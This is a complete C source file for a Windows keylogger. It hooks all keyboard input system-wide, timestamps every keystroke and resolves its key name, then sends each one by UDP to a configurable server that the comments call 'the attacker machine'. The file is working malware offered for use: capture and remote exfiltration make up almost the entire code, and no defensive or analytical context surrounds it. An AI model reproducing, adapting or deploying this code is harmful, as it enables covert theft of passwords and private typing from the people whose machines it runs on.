#include <minwindef.h>
#include <sec_api/stdio_s.h>
#include <string.h>
#include <winsock2.h>
#include <ws2tcpip.h> // For inet_pton
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>

#define WM_APP_KEYDATA (WM_APP + 1)

// following values are supposed to be changed
#define SERVER_IP "127.0.0.1" // ip of the attacker machine
#define SERVER_PORT 1025 // port number which is open to receive on attcker machine

// function declaration
LRESULT LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);

// structure to store key data
typedef struct {
    SYSTEMTIME dateTimeStamp;
    DWORD vkCode;
    DWORD scanCode;
    DWORD flags;
} KEYDATA;

// global variables
HHOOK keyboardHook;
SYSTEMTIME stUTC;

// required to pass messages from thread spawned for keyboard hook procedure to main thread (PostThreadMessage)
DWORD dwMainThreadId;

// entry point for gui apps on windows
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd) {

    dwMainThreadId = GetCurrentThreadId();


    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2,2), &wsaData) != 0) {
        fprintf(stderr, "Error: Failed to intialize winsock. Error code: %lu\n", GetLastError());
        return EXIT_FAILURE;
    }

    SOCKET sendSocket = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (sendSocket == INVALID_SOCKET) {
        fprintf(stderr, "Error: Failed to create udp socket. Error code: %lu\n", GetLastError());
        WSACleanup();
        return EXIT_FAILURE;
    }

    struct sockaddr_in serverAddr;
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(SERVER_PORT);

    if (inet_pton(AF_INET, SERVER_IP, &serverAddr.sin_addr) <= 0) {
        fprintf(stderr, "Error: Failed to covert ip from string to binary. Error code: %lu\n", GetLastError());
        closesocket(sendSocket);
        WSACleanup();
        return EXIT_FAILURE;
    }

    keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, GetModuleHandle(NULL), 0);
    if (!keyboardHook) {
        fprintf(stderr, "Error: Failed to set keyboard hook. Error code: %lu\n", GetLastError());
        return EXIT_FAILURE;
    } else {
        wprintf(L"Keyboard hook set successfully.\n");
    }

    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        if (msg.message == WM_APP_KEYDATA) {
            KEYDATA* pKeyData = (KEYDATA*)msg.lParam;

            char keyNameA[24];
            WCHAR keyNameW[12];
            BYTE keyboardState[256];
            char fKeyInfo[128];
            int bytesSent;

            if (pKeyData) {
                switch (pKeyData->vkCode) {
                    case VK_BACK:   strcpy(keyNameA, "Backspace"); break;
                    case VK_RETURN: strcpy(keyNameA,"Enter"); break;
                    case VK_TAB:    strcpy(keyNameA, "Tab"); break;
                    case VK_SHIFT:
                    case VK_LSHIFT:
                    case VK_RSHIFT: strcpy(keyNameA, "Shift"); break;
                    case VK_CONTROL:
                    case VK_LCONTROL:
                    case VK_RCONTROL: strcpy(keyNameA, "Control"); break;
                    case VK_MENU:
                    case VK_LMENU:
                    case VK_RMENU:  strcpy(keyNameA, "Alt"); break;
                    case VK_LWIN:
                    case VK_RWIN:   strcpy(keyNameA, "Windows key"); break;
                    case VK_ESCAPE: strcpy(keyNameA, "Escape"); break;
                    case VK_SPACE: strcpy(keyNameA, "Space"); break;
                    case VK_VOLUME_DOWN: strcpy(keyNameA, "Volume Down"); break;
                    case VK_VOLUME_UP: strcpy(keyNameA, "Volume Up"); break;
                    case VK_VOLUME_MUTE: strcpy(keyNameA, "Mute"); break;
                    case VK_PLAY: strcpy(keyNameA, "Play"); break;
                    case VK_PAUSE: strcpy(keyNameA, "Pause"); break;

                    default:
                        if (GetKeyboardState(keyboardState) == FALSE) {
                            fprintf(stderr, "Error: Failed to get keyboard state. GetLastError = %lu\n", GetLastError());
                            return EXIT_FAILURE;
                        }
                        if (ToUnicode(pKeyData->vkCode, pKeyData->scanCode, keyboardState, keyNameW, _countof(keyNameW), 0) > 0) {
                            // Convert the WCHAR result to CHAR (`keyNameA`)
                            // CP_ACP is the system's current ANSI code page.
                            WideCharToMultiByte(CP_ACP, 0, keyNameW, -1, keyNameA, sizeof(keyNameA), NULL, NULL);
                        } else {
                            // Fallback to GetKeyNameTextA for other keys (like F1-F12, Home, etc.)
                            // Bit 24 indicates an extended key, such as the right-hand ALT and CTRL keys.
                            LONG lParam_for_getkey = (pKeyData->scanCode << 16) | ((pKeyData->flags & LLKHF_EXTENDED) << 24);
                            GetKeyNameTextA(lParam_for_getkey, keyNameA, sizeof(keyNameA));
                        }
                        break;
                }

                _snprintf_s(
                    fKeyInfo,
                    sizeof(fKeyInfo),
                    _TRUNCATE,
                    "[%04d-%02d-%02d %02d:%02d:%02d] 0x%02lX '%s'\n",
                    pKeyData->dateTimeStamp.wYear, pKeyData->dateTimeStamp.wMonth, pKeyData->dateTimeStamp.wDay,
                    pKeyData->dateTimeStamp.wHour, pKeyData->dateTimeStamp.wMinute, pKeyData->dateTimeStamp.wSecond,
                    pKeyData->vkCode, keyNameA
                );

                bytesSent = sendto(sendSocket, fKeyInfo, (int)strlen(fKeyInfo), 0, (struct sockaddr *)&serverAddr, sizeof(serverAddr));

                if (bytesSent == SOCKET_ERROR) {
                    fprintf(stderr, "Error: Failed to send key message. Error code: %lu\n", GetLastError());
                    continue;
                } else {
                    printf("Bytes sent: %d\n", bytesSent);
                }

                free(pKeyData); // freeing the malloc which was executed in hook
            }

        } else {
            TranslateMessage(&msg);
            DispatchMessage(&msg);
        }
    }

    UnhookWindowsHookEx(keyboardHook);
    closesocket(sendSocket);
    WSACleanup();
    return (int)msg.wParam;
}


LRESULT LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {

    if (nCode == HC_ACTION) {

        GetSystemTime(&stUTC);

        if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {
            KBDLLHOOKSTRUCT* pkbhs = (KBDLLHOOKSTRUCT*)lParam;
            KEYDATA* pData = (KEYDATA*)malloc(sizeof(KEYDATA));
            if (pData != NULL) {
                pData->dateTimeStamp = stUTC;
                pData->vkCode = pkbhs->vkCode;
                pData->scanCode = pkbhs->scanCode;
                pData->flags = pkbhs->flags;
                PostThreadMessage(dwMainThreadId, WM_APP_KEYDATA, 0, (LPARAM)pData);
            }
        }
    }

    return CallNextHookEx(keyboardHook, nCode, wParam, lParam);
}
